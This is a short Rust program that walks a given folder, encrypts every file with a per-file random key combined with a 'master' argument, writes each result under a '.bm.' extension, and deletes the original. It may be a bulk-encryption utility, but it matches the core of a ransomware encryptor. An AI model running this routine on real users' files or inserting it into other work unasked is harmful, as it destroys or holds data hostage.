use std::env;
use std::path::PathBuf;
use std::io::{Write, Result};
use std::fs::{self, File};

use lib::crypto::encrypt;

fn main() {
    let args = env::args()
        .skip(1)
        .collect::<Vec<String>>()
        .join(" ");

    let verbose = lib::misc::get_flag(&args, "verbose");

    let master = lib::misc::get_val(&args, "master");

    let folder = lib::misc::get_val(&args, "folder");
    let files = lib::file::get_files(folder);

    for file in &files {
        _ = process_file(
            file,
            &master
        );

        if verbose {
            println!("done for: {:?}", file);
        }
    }
}

pub fn process_file(file: &PathBuf, master: &str) -> Result<()> {
    let key = lib::misc::gen_str(100);
    let suffix = lib::misc::gen_str(10);

    let full_key = format!("{}{}{}", key, suffix, master);

    let content = fs::read(file)?;
    let new_content = format!("{}{}", key, encrypt(&content, &full_key));

    let new_file = {
        let name = file
            .file_name()
            .unwrap()
            .to_string_lossy();

        let new_name = format!("{}.bm.{}", name, suffix);

        let mut path = PathBuf::from(file);
        path.set_file_name(new_name);
        
        path
    };

    let mut handle = File::create(new_file)?;
    handle.write_all(new_content.as_bytes())?;

    lib::file::delete_file(file)?;

    Ok(())
}